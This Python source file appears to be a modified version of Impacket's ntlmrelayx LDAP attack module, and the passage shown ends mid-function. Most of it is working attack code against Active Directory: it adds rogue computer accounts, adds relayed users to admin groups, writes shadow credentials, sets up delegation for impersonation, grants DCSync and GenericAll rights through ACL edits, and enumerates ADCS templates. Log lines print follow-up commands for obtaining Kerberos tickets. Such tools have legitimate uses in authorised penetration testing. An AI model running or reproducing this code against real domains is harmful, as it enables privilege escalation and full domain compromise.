# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   LDAP Attack Class
#   LDAP(s) protocol relay attack
#
# Authors:
#   Alberto Solino (@agsolino)
#   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#
import _thread
import random
import string
import json
import datetime
import binascii
import codecs
from enum import Enum
import re
import ldap3
import ldapdomaindump
from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.protocol.formatters.formatters import format_sid
from ldap3.utils.conv import escape_filter_chars
import os
from Cryptodome.Hash import MD4
import logging

from impacket import LOG
from impacket.examples.ldap_shell import LdapShell
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
from impacket.ldap import ldaptypes
from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
from impacket.uuid import string_to_bin, bin_to_string
from impacket.structure import Structure, hexdump

from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime
from dsinternals.common.data.hello.KeyCredential import KeyCredential

from powerview.utils.constants import WELL_KNOWN_SIDS, EXTENDED_RIGHTS_NAME_MAP, EXTENDED_RIGHTS_MAP, SCHEMA_OBJECTS

# This is new from ldap3 v2.5
try:
    from ldap3.protocol.microsoft import security_descriptor_control
except ImportError:
    # We use a print statement because the logger is not initialized yet here
    print("Failed to import required functions from ldap3. ntlmrelayx requires ldap3 >= 2.5.0. \
Please update with 'python -m pip install ldap3 --upgrade'")
PROTOCOL_ATTACK_CLASS = "LDAPAttack"

# Define global variables to prevent dumping the domain twice
# and to prevent privilege escalating more than once
dumpedDomain = False
dumpedAdcs = False
alreadyEscalated = False
alreadyAddedComputer = False
delegatePerformed = []

#gMSA structure
class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        #('AlignmentPadding',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)

    def fromString(self, data):
        Structure.fromString(self,data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]

        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]

class LDAPAttack(ProtocolAttack):
    """
    This is the default LDAP attack. It checks the privileges of the relayed account
    and performs a domaindump if the user does not have administrative privileges.
    If the user is an Enterprise or Domain admin, a new user is added to escalate to DA.
    """
    PLUGIN_NAMES = ["LDAP", "LDAPS"]

    # ACL constants
    # When reading, these constants are actually represented by
    # the following for Active Directory specific Access Masks
    # Reference: https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2
    GENERIC_READ            = 0x00020094
    GENERIC_WRITE           = 0x00020028
    GENERIC_EXECUTE         = 0x00020004
    GENERIC_ALL             = 0x000F01FF

    def __init__(self, config, LDAPClient, username, root_dn, args=None):
        if args:
            self.principalidentity_dn = args.principalidentity_dn
            self.principalidentity_sid = format_sid(args.principalidentity_sid)
            self.targetidentity_dn = args.targetidentity_dn
            #self.targetidentity_sid = format_sid(args.targetidentity_sid)
            self.args = args

        self.rootDN = root_dn
        self.computerName = '' if not config.addcomputer else config.addcomputer[0]
        self.computerPassword = '' if not config.addcomputer or len(config.addcomputer) < 2 else config.addcomputer[1]
        ProtocolAttack.__init__(self, config, LDAPClient, username)
        if self.config.interactive:
            # Launch locally listening interactive shell.
            self.tcp_shell = TcpShell()

    def addComputer(self, parent, domainDumper):
        """
        Add a new computer. Parent is preferably CN=computers,DC=Domain,DC=local, but can
        also be an OU or other container where we have write privileges
        """
        global alreadyAddedComputer
        if alreadyAddedComputer:
            LOG.error('New computer already added. Refusing to add another')
            return False

        if not self.client.tls_started and not self.client.server.ssl:
            LOG.info('Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
            if not self.client.start_tls():
                LOG.error('StartTLS failed')
                return False

        # Get the domain we are in
        domaindn = domainDumper.root
        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]

        computerName = self.computerName
        if not computerName:
            # Random computername
            newComputer = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
        else:
            newComputer = computerName if computerName.endswith('$') else computerName + '$'

        computerPassword = self.computerPassword
        if not computerPassword:
            # Random password
            newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
        else:
            newPassword = computerPassword

        computerHostname = newComputer[:-1]
        newComputerDn = ('CN=%s,%s' % (computerHostname, parent)).encode('utf-8')

        # Default computer SPNs
        spns = [
            'HOST/%s' % computerHostname,
            'HOST/%s.%s' % (computerHostname, domain),
            'RestrictedKrbHost/%s' % computerHostname,
            'RestrictedKrbHost/%s.%s' % (computerHostname, domain),
        ]
        ucd = {
            'dnsHostName': '%s.%s' % (computerHostname, domain),
            'userAccountControl': 4096,
            'servicePrincipalName': spns,
            'sAMAccountName': newComputer,
            'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
        }
        LOG.debug('New computer info %s', ucd)
        LOG.info('Attempting to create computer in: %s', parent)
        res = self.client.add(newComputerDn.decode('utf-8'), ['top','person','organizationalPerson','user','computer'], ucd)
        if not res:
            # Adding computers requires LDAPS
            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
                LOG.error('Failed to add a new computer. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing account.')
            else:
                LOG.error('Failed to add a new computer: %s' % str(self.client.result))
            return False
        else:
            LOG.info('Adding new computer with username: %s and password: %s result: OK' % (newComputer, newPassword))
            alreadyAddedComputer = True
            # Return the SAM name
            return newComputer

    def addUserToGroup(self, userDn, domainDumper, groupDn):
        global alreadyEscalated
        # For display only
        groupName = groupDn.split(',')[0][3:]
        userName = userDn.split(',')[0][3:]
        # Now add the user as a member to this group
        res = self.client.modify(groupDn, {
            'member': [(ldap3.MODIFY_ADD, [userDn])]})
        if res:
            LOG.info('Adding user: %s to group %s result: OK' % (userName, groupName))
            LOG.info('Privilege escalation succesful, shutting down...')
            alreadyEscalated = True
            _thread.interrupt_main()
        else:
            LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))


    def shadowCredentialsAttack(self, ShadowCredentialsExportType="PFX"):
        LOG.info("Searching for the target account")

        # Get the domain we are in
        domaindn = self.rootDN
        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]

        # Get target computer DN
        self.client.search(self.rootDN, f'(distinguishedName={self.targetidentity_dn})', attributes=['objectSid','sAMAccountName'])
        result = self.client.entries
        #result = self.getUserInfo(self.targetidentity_dn)
        if len(result) == 0:
            LOG.error('Target account does not exist! (wrong domain?)')
            return
        else:
            target_dn = result[0].entry_dn
            target_sid = result[0]['objectSid'].values[0]
            LOG.info("Target user found: %s" % target_dn)

        LOG.info("Generating certificate")
        certificate = X509Certificate2(subject=target_sid, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
        LOG.info("Certificate generated")
        LOG.info("Generating KeyCredential")
        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
        LOG.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
        LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
        self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.client.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            LOG.error('Could not query target user properties')
            return
        try:
            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
            LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.targetidentity_dn)
            self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
            if self.client.result['result'] == 0:
                LOG.info("Updated the msDS-KeyCredentialLink attribute of the target object")
                path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                LOG.debug("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
                if ShadowCredentialsExportType == "PEM":
                    certificate.ExportPEM(path_to_files=path)
                    LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
                    LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
                    LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                    LOG.info("Run the following command to obtain a TGT")
                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, self.targetidentity_dn, path))
                elif ShadowCredentialsExportType == "PFX":
                    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
                    LOG.debug("The certificate will be store with the password: %s" % password)
                    certificate.ExportPFX(password=password, path_to_file=path)
                    LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                    LOG.info("Must be used with password: %s" % password)
                    LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                    LOG.info("Run the following command to obtain a TGT")
                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, self.targetidentity_dn, path))
            else:
                if self.client.result['result'] == 50:
                    LOG.error('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
                elif self.client.result['result'] == 19:
                    LOG.error('Could not modify object, the server reports a constrained violation: %s' % self.client.result['message'])
                else:
                    LOG.error('The server returned an error: %s' % self.client.result['message'])
        except IndexError:
            LOG.info('Attribute msDS-KeyCredentialLink does not exist')
        return

    def delegateAttack(self):
        self.client.search(self.targetidentity_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        target_entries = self.client.entries
        targetuser = None
        for entry in self.client.response:
            if entry['type'] != 'searchResEntry':
                continue
            targetuser = entry
        if not targetuser:
            LOG.error('Could not query target user properties')
            return
        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
            LOG.debug('Currently allowed sids:')
            for ace in sd['Dacl'].aces:
                LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
        except IndexError:
            # Create DACL manually
            sd = create_empty_sd()
        sd['Dacl'].aces.append(create_allow_ace(self.principalidentity_sid))
        self.client.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
        if self.client.result['result'] == 0:
            LOG.info('Delegation rights modified succesfully!')
            LOG.info('%s can now impersonate users on %s via S4U2Proxy', self.principalidentity_dn, target_entries[0]['sAMAccountName'].values[0])
            return True
        else:
            if self.client.result['result'] == 50:
                LOG.error('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
            elif self.client.result['result'] == 19:
                LOG.error('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
            else:
                LOG.error('The server returned an error: %s', self.client.result['message'])
            return False

    def dacl_remove_ace(self,secdesc, guid, usersid, accesstype):
        to_remove = None
        binguid = string_to_bin(guid)
        for ace in secdesc['Dacl'].aces:
            sid = ace['Ace']['Sid'].formatCanonical()
            # Is it the correct ACE type?
            if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
                continue
            # Is it the correct SID?
            if sid != usersid:
                continue
            # Does it apply to the correct property?
            if ace['Ace']['ObjectType'] != binguid:
                continue
            # Does it have the correct mask?
            if ace['Ace']['Mask']['Mask'] != accesstype:
                continue
            # We are still here -> this is the correct ACE
            to_remove = ace
            break

        if to_remove:
            # Found! Remove
            secdesc['Dacl'].aces.remove(to_remove)
            return True
        else:
            # Not found
            return False

    def aclAttack(self):
        rights = {
                'dcsync':[EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes'], EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes-All']],
                #'all':[EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes'],EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes-All'], EXTENDED_RIGHTS_NAME_MAP['User-Force-Change-Password'], EXTENDED_RIGHTS_NAME_MAP['Self-Membership']],
                'all':[SIMPLE_PERMISSIONS.FullControl.value],
                'resetpassword':[EXTENDED_RIGHTS_NAME_MAP['User-Force-Change-Password']],
                'writemembers':[EXTENDED_RIGHTS_NAME_MAP['Self-Membership']]
            }

        # Query for the sid of our user
        try:
            self.client.search(self.principalidentity_dn, '(objectClass=user)', attributes=['sAMAccountName', 'objectSid'])
            entry = self.client.entries[0]
        except IndexError:
            LOG.error('Could not retrieve infos for user: %s' % self.principalidentity_dn)
            return
        username = entry['sAMAccountName'].value
        usersid = entry['objectSid'].value
        LOG.debug('Found sid for user %s: %s' % (username, usersid))

        # Set SD flags to only query for DACL
        controls = security_descriptor_control(sdflags=0x04)
        alreadyEscalated = True

        #LOG.info('Querying domain security descriptor')
        self.client.search(self.rootDN, f'(distinguishedName={self.targetidentity_dn})', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)

        #if len(self.client.entries) == 0:
        #    LOG.error(f'{self.args.targetidentity} not found in domain. Ensure to use valid object distinguishedName property')
        #    return
        
        entry = self.client.entries[0]
        secDescData = entry['nTSecurityDescriptor'].raw_values[0]
        secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)

        if not self.args.delete:
            aceflags = 0x00
            if hasattr(self.args, "inheritance") and self.args.inheritance:
                LOG.debug('Inheritance is set. Adding CONTAINER_INHERIT_ACE, OBJECT_INFERIT_ACE')
                aceflags = ACE.CONTAINER_INHERIT_ACE + ACE.OBJECT_INHERIT_ACE
        
            if self.args.rights.lower() in list(rights.keys()):
                if self.args.rights.lower() == "all":
                    secDesc['Dacl']['Data'].append(create_ace(SIMPLE_PERMISSIONS.FullControl.value, usersid, aceflags))
                else:
                    for guid in rights[self.args.rights.lower()]:
                        secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid, aceflags))
            else:
                LOG.error(f'{self.args.rights} right is not valid')
                return
        else:
            #accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
            accesstype = 983551
            for guid in rights[self.args.rights]:
                if not self.dacl_remove_ace(secDesc, guid, usersid, accesstype):
                    LOG.error(f'ACE not found in {self.args.targetidentity}')
                    return

        dn = entry.entry_dn
        data = secDesc.getData()
        self.client.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
        if self.client.result['result'] == 0:
            if not self.args.delete:
                if self.args.rights == 'dcsync':
                    LOG.info('Success! User %s now has Replication-Get-Changes-All privileges on the domain', username)
                elif self.args.rights == 'writemembers':
                    LOG.info('Success! User %s now has "Add/Remove Self as Member" privileges on %s', username, self.args.targetidentity)
                elif self.args.rights == 'resetpassword':
                    LOG.info('Success! User %s now has Reset Password privileges on %s', username, self.args.targetidentity)
                elif self.args.rights == 'all':
                    LOG.info('Success! User %s now has GenericAll privileges on %s', username, self.args.targetidentity)
            else:
                if self.args.rights == 'dcsync':
                    LOG.info('Success! Replication-Get-Changes-All privileges restored for %s', username)
                elif self.args.rights == 'writemembers':
                    LOG.info('Success! GenericWrite privileges restored for %s', username)
                elif self.args.rights == 'resetpassword':
                    LOG.info('Success! Reset Password privileges restored for %s', username)
                elif self.args.rights == 'all':
                    LOG.info('Success! GenericAll privileges restored for %s', username)


            # Query the SD again to see what AD made of it
            self.client.search(self.rootDN, '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
            entry = self.client.entries[0]
            newSD = entry['nTSecurityDescriptor'].raw_values[0]
            return True
        else:
            LOG.error('Error when updating ACL: %s' % self.client.result)
            return False

    def validatePrivileges(self, uname, domainDumper):
        # Find the user's DN
        membersids = []
        sidmapping = {}
        privs = {
            'create': False, # Whether we can create users
            'createIn': None, # Where we can create users
            'escalateViaGroup': False, # Whether we can escalate via a group
            'escalateGroup': None, # The group we can escalate via
            'aclEscalate': False, # Whether we can escalate via ACL on the domain object
            'aclEscalateIn': None # The object which ACL we can edit
        }
        self.client.search(domainDumper.root, '(sAMAccountName=%s)' % escape_filter_chars(uname), attributes=['objectSid', 'primaryGroupId'])
        user = self.client.entries[0]
        usersid = user['objectSid'].value
        sidmapping[usersid] = user.entry_dn
        membersids.append(usersid)
        # The groups the user is a member of
        self.client.search(domainDumper.root, '(member:1.2.840.113556.1.4.1941:=%s)' % escape_filter_chars(user.entry_dn), attributes=['name', 'objectSid'])
        LOG.debug('User is a member of: %s' % self.client.entries)
        for entry in self.client.entries:
            sidmapping[entry['objectSid'].value] = entry.entry_dn
            membersids.append(entry['objectSid'].value)
        # Also search by primarygroupid
        # First get domain SID
        self.client.search(domainDumper.root, '(objectClass=domain)', attributes=['objectSid'])
        domainsid = self.client.entries[0]['objectSid'].value
        gid = user['primaryGroupId'].value
        # Now search for this group by SID
        self.client.search(domainDumper.root, '(objectSid=%s-%d)' % (domainsid, gid), attributes=['name', 'objectSid', 'distinguishedName'])
        group = self.client.entries[0]
        LOG.debug('User is a member of: %s' % self.client.entries)
        # Add the group sid of the primary group to the list
        sidmapping[group['objectSid'].value] = group.entry_dn
        membersids.append(group['objectSid'].value)
        controls = security_descriptor_control(sdflags=0x05) # Query Owner and Dacl
        # Now we have all the SIDs applicable to this user, now enumerate the privileges of domains and OUs
        entries = self.client.extend.standard.paged_search(domainDumper.root, '(|(objectClass=domain)(objectClass=organizationalUnit))', attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls, generator=True)
        self.checkSecurityDescriptors(entries, privs, membersids, sidmapping, domainDumper)
        # Also get the privileges on the default Users container
        entries = self.client.extend.standard.paged_search(domainDumper.root, '(&(cn=Users)(objectClass=container))', attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls, generator=True)
        self.checkSecurityDescriptors(entries, privs, membersids, sidmapping, domainDumper)

        # Interesting groups we'd like to be a member of, in order of preference
        interestingGroups = [
            '%s-%d' % (domainsid, 519), # Enterprise admins
            '%s-%d' % (domainsid, 512), # Domain admins
            'S-1-5-32-544', # Built-in Administrators
            'S-1-5-32-551', # Backup operators
            'S-1-5-32-548', # Account operators
        ]
        privs['escalateViaGroup'] = False
        for group in interestingGroups:
            self.client.search(domainDumper.root, '(objectSid=%s)' % group, attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls)
            groupdata = self.client.response
            self.checkSecurityDescriptors(groupdata, privs, membersids, sidmapping, domainDumper)
            if privs['escalateViaGroup']:
                # We have a result - exit the loop
                break
        return (usersid, privs)

    def getUserInfo(self, samname):
        entries = self.client.search(self.rootDN, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
        try:
            dn = self.client.entries[0].entry_dn
            sid = format_sid(self.client.entries[0]['objectSid'])
            return (dn, sid)
        except IndexError:
            LOG.error('User not found in LDAP: %s' % samname)
            return False

    def checkSecurityDescriptors(self, entries, privs, membersids, sidmapping, domainDumper):
        standardrights = [
            self.GENERIC_ALL,
            self.GENERIC_WRITE,
            self.GENERIC_READ,
            ACCESS_MASK.WRITE_DACL
        ]
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            dn = entry['dn']
            try:
                sdData = entry['raw_attributes']['nTSecurityDescriptor'][0]
            except IndexError:
                # We don't have the privileges to read this security descriptor
                LOG.debug('Access to security descriptor was denied for DN %s', dn)
                continue
            hasFullControl = False
            secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR()
            secDesc.fromString(sdData)
            if secDesc['OwnerSid'] != '' and secDesc['OwnerSid'].formatCanonical() in membersids:
                sid = secDesc['OwnerSid'].formatCanonical()
                LOG.debug('Permission found: Full Control on %s; Reason: Owner via %s' % (dn, sidmapping[sid]))
                hasFullControl = True
            # Iterate over all the ACEs
            for ace in secDesc['Dacl'].aces:
                sid = ace['Ace']['Sid'].formatCanonical()
                if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE and ace['AceType'] != ACCESS_ALLOWED_ACE.ACE_TYPE:
                    continue
                if not ace.hasFlag(ACE.INHERITED_ACE) and ace.hasFlag(ACE.INHERIT_ONLY_ACE):
                    # ACE is set on this object, but only inherited, so not applicable to us
                    continue

                # Check if the ACE has restrictions on object type (inherited case)
                if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE \
                    and ace.hasFlag(ACE.INHERITED_ACE) \
                    and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_INHERITED_OBJECT_TYPE_PRESENT):
                    # Verify if the ACE applies to this object type
                    inheritedObjectType = bin_to_string(ace['Ace']['InheritedObjectType']).lower()
                    if not self.aceApplies(inheritedObjectType, entry['raw_attributes']['objectClass'][-1]):
                        continue
                # Check for non-extended rights that may not apply to us
                if ace['Ace']['Mask']['Mask'] in standardrights or ace['Ace']['Mask'].hasPriv(ACCESS_MASK.WRITE_DACL):
                    # Check if this applies to our objecttype
                    if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE  and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT):
                        objectType = bin_to_string(ace['Ace']['ObjectType']).lower()
                        if not self.aceApplies(objectType, entry['raw_attributes']['objectClass'][-1]):
                            # LOG.debug('ACE does not apply, only to %s', objectType)
                            continue
                if sid in membersids:
                    # Generic all
                    if ace['Ace']['Mask'].hasPriv(self.GENERIC_ALL):
                        LOG.debug('Permission found: Full Control on %s; Reason: GENERIC_ALL via %s' % (dn, sidmapping[sid]))
                        hasFullControl = True
                    if can_create_users(ace) or hasFullControl:
                        if not hasFullControl:
                            LOG.debug('Permission found: Create users in %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
                        if dn == 'CN=Users,%s' % domainDumper.root:
                            # We can create users in the default container, this is preferred
                            privs['create'] = True
                            privs['createIn'] = dn
                        else:
                            # Could be a different OU where we have access
                            # store it until we find a better place
                            if privs['createIn'] != 'CN=Users,%s' % domainDumper.root and b'organizationalUnit' in entry['raw_attributes']['objectClass']:
                                privs['create'] = True
                                privs['createIn'] = dn
                    if can_add_member(ace) or hasFullControl:
                        if b'group' in entry['raw_attributes']['objectClass']:
                            # We can add members to a group
                            if not hasFullControl:
                                LOG.debug('Permission found: Add member to %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
                            privs['escalateViaGroup'] = True
                            privs['escalateGroup'] = dn
                    if ace['Ace']['Mask'].hasPriv(ACCESS_MASK.WRITE_DACL) or hasFullControl:
                        # Check if the ACE is an OBJECT ACE, if so the WRITE_DACL is applied to
                        # a property, which is both weird and useless, so we skip it
                        if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE \
                            and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT):
                            # LOG.debug('Skipping WRITE_DACL since it has an ObjectType set')
                            continue
                        if not hasFullControl:
                            LOG.debug('Permission found: Write Dacl of %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
                        # We can modify the domain Dacl
                        if b'domain' in entry['raw_attributes']['objectClass']:
                            privs['aclEscalate'] = True
                            privs['aclEscalateIn'] = dn

    @staticmethod
    def aceApplies(ace_guid, object_class):
        '''
        Checks if an ACE applies to this object (based on object classes).
        Note that this function assumes you already verified that InheritedObjectType is set (via the flag).
        If this is not set, the ACE applies to all object types.
        '''
        try:
            our_ace_guid = OBJECTTYPE_GUID_MAP[object_class]
        except KeyError:
            return False
        if ace_guid == our_ace_guid:
            return True
        # If none of these match, the ACE does not apply to this object
        return False

    def dumpADCS(self):

        def is_template_for_authentification(entry):
            authentication_ekus = [b"1.3.6.1.5.5.7.3.2", b"1.3.6.1.5.2.3.4", b"1.3.6.1.4.1.311.20.2.2", b"2.5.29.37.0"]

            # Ignore templates requiring manager approval
            if entry["attributes"]["msPKI-Enrollment-Flag"] & 0x02:
                return False

            # No EKU = works for client authentication
            if not len(entry["raw_attributes"]["pKIExtendedKeyUsage"]):
                return True

            try:
                next((eku for eku in entry["raw_attributes"]["pKIExtendedKeyUsage"] if eku in authentication_ekus))
                return True
            except StopIteration:
                return False

        def get_enrollment_principals(entry):
            # Mostly taken from github.com/ly4k/Certipy/certipy/security.py
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
            sd.fromString(entry["raw_attributes"]["nTSecurityDescriptor"][0])

            enrollment_uuids = [
                "00000000-0000-0000-0000-000000000000", # All-Extended-Rights
                "0e10c968-78fb-11d2-90d4-00c04f79dc55", # Certificate-Enrollment
                "a05b8cc2-17bc-4802-a710-e7c15ab866a2", # Certificate-AutoEnrollment
            ]

            enrollment_principals = set()

            for ace in (a for a in sd["Dacl"]["Data"] if a["AceType"] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE):
                sid = format_sid(ace["Ace"]["Sid"].getData())
                if ace["Ace"]["ObjectTypeLen"] == 0:
                    uuid = bin_to_string(ace["Ace"]["InheritedObjectType"]).lower()
                else:
                    uuid = bin_to_string(ace["Ace"]["ObjectType"]).lower()

                if not uuid in enrollment_uuids:
                    continue

                enrollment_principals.add(sid)

            return enrollment_principals

        def translate_sids(sids):
            default_naming_context = self.client.server.info.other["defaultNamingContext"][0]
            try:
                domain_fqdn = self.client.server.info.other["ldapServiceName"][0].split("@")[1]
            except (KeyError, IndexError):
                domain_fqdn = ""

            sid_map = dict()

            for sid in sids:
                try:
                    if sid.startswith("S-1-5-21-"):
                        self.client.search(default_naming_context, "(&(objectSid=%s)(|(objectClass=group)(objectClass=user)))" % sid,
                                    attributes=["name", "objectSid"], search_scope=ldap3.SUBTREE)
                    else:
                        self.client.search("CN=WellKnown Security Principals," + configuration_naming_context,
                                    "(&(objectSid=%s)(objectClass=foreignSecurityPrincipal))" % sid, attributes=["name", "objectSid"],
                                    search_scope=ldap3.LEVEL)
                except:
                    sid_map[sid] = sid
                    continue

                if not len(self.client.response):
                    sid_map[sid] = sid
                else:
                    sid_map[sid] = domain_fqdn + "\\" + self.client.response[0]["attributes"]["name"]

            return sid_map


        LOG.info("Attempting to dump ADCS enrollment services info")

        configuration_naming_context = self.client.server.info.other['configurationNamingContext'][0]

        enrollment_service_attributes = ["certificateTemplates", "displayName", "dNSHostName", "msPKI-Enrollment-Servers", "nTSecurityDescriptor"]
        self.client.search("CN=Enrollment Services,CN=Public Key Services,CN=Services," + configuration_naming_context,
                           "(objectClass=pKIEnrollmentService)", search_scope=ldap3.LEVEL, attributes=enrollment_service_attributes,
                           controls=security_descriptor_control(sdflags=0x04))

        if not len(self.client.response):
            LOG.info("No ADCS enrollment service found")
            return

        offered_templates = set()
        sid_map = dict()
        for entry in self.client.response:
            LOG.info("Found ADCS enrollment service `%s` on host `%s`, offering templates: %s" % (entry["attributes"]["displayName"],
                     entry["attributes"]["dNSHostName"], ", ".join(("`" + tpl + "`" for tpl in entry["attributes"]["certificateTemplates"]))))

            offered_templates.update(entry["attributes"]["certificateTemplates"])
            enrollment_principals = get_enrollment_principals(entry)

            known_sids = set(sid_map.keys())
            unknwown_sids = enrollment_principals.difference(known_sids)
            sid_map.update(translate_sids(unknwown_sids))

            LOG.info("Principals who can enroll on enrollment service `%s`: %s" % (entry["attributes"]["displayName"],
                     ", ".join(("`" + sid_map[principal] + "`" for principal in enrollment_principals))))

        if not len(offered_templates):
            LOG.info("No templates offered by the enrollment services")
            return

        LOG.info("Attempting to dump ADCS certificate templates enrollment rights, for templates allowing for client authentication and not requiring manager approval")

        certificate_template_attributes = ["msPKI-Enrollment-Flag", "name", "nTSecurityDescriptor", "pKIExtendedKeyUsage"]
        self.client.search("CN=Certificate Templates,CN=Public Key Services,CN=Services," + configuration_naming_context,
                           "(&(objectClass=pKICertificateTemplate)(|%s))" % "".join(("(name=" + escape_filter_chars(tpl) + ")" for tpl in offered_templates)),
                           search_scope=ldap3.LEVEL, attributes=certificate_template_attributes,
                           controls=security_descriptor_control(sdflags=0x04))

        for entry in (e for e in self.client.response if is_template_for_authentification(e)):
            enrollment_principals = get_enrollment_principals(entry)

            known_sids = set(sid_map.keys())
            unknwown_sids = enrollment_principals.difference(known_sids)
            sid_map.update(translate_sids(unknwown_sids))

